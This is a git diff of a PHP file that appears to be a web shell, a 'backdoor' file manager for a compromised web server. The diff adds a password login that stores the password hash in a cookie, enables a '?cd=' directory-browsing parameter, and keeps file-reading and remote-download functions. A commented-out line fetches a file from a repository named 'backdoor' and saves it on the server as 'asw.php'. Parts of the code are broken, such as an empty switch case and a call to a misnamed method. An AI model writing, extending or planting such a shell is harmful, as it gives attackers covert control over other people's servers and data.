@@ -1,7 +1,39 @@
 <?php
-/**
- * 
- */
+class auth
+{
+	private $password;
+	protected $cookie;
+	protected $post;
+	protected $expired;
+	function __construct($password, $expired)
+	{
+		$this->password = $password;
+		$this->expired  = $expired;
+		if(isset($this->password) && (trim($this->password) != '')){
+			$this->cookie = $_COOKIE;
+			$this->post = $_POST;
+			if(isset($this->post['pass'])){
+				$yourPassword = sha1($this->post['pass']);
+				if (password_verify($this->post["pass"], $this->password)) {
+					setcookie("pass", $this->password, time()+$this->expired, "/");
+					header("Location: {$_SERVER['PHP_SELF']}");
+				}
+			}
+			if(!isset($this->cookie['pass']) || ((isset($this->cookie['pass']) && ($this->cookie['pass'] != $this->password)))){
+				$this->displayLogin();
+				die();
+			}
+		}
+	}
+	public function displayLogin()
+	{
+		?>
+		<form method='post'>
+			<input type='password'name='pass'>
+		</form>
+		<?php
+	}
+}
 class listFiles
 {
 	protected $path;
@@ -27,6 +59,9 @@ class listFiles
 			];
 
 			switch ($type) {
+				case 'all':
+					if (is_dir($filename["getPathname"]));
+					break;
 				case "dir":
 					if (!is_dir($filename["getPathname"]) || $value === "." || $value === "..") {
 						continue 2;
@@ -44,7 +79,7 @@ class listFiles
 		} return $this->result;
 	}
 
-	public function dirs()
+	public function folders()
 	{
 		return $this->list("dir");
 	}
@@ -204,7 +239,6 @@ class Action
 		}
 	}
 
-
 	public function read()
 	{
 		return htmlspecialchars(file_get_contents($this->filename));
@@ -242,7 +276,10 @@ class Action
 				return false;
 			}
 			return true;
-		} return false;
+		}
+		throw new Exception("Must be url", 1);
+		
+		return false;
 	}
 
 	public function download($url = null, $filename = null)
@@ -297,18 +334,19 @@ class Action
 	}
 }
 
-// if (isset($_GET['cd'])) {
-// 	new cd($_GET['cd']);
-// }
+if (isset($_GET['cd'])) {
+	new cd($_GET['cd']);
+}
 // // $Action = new Action;
 // // var_dump($Action->download("https://raw.githubusercontent.com/rabbitx1337/backdoor/main/FileSystem.php", "asw.php"));
 // // die();
 
-// $list = new listFiles;
+$list = new listFiles;
 
-// foreach ($list->dirs() as $key => $value) {
+// foreach ($list->folder() as $key => $value) {
 // 	print("<a href='?cd={$value['getPathname']}'>{$value['getName']}</a><br>");
 // }
 // foreach ($list->files() as $key => $value) {
 // 	print($value['getName']."<br>");
 // }
+var_dump($list);
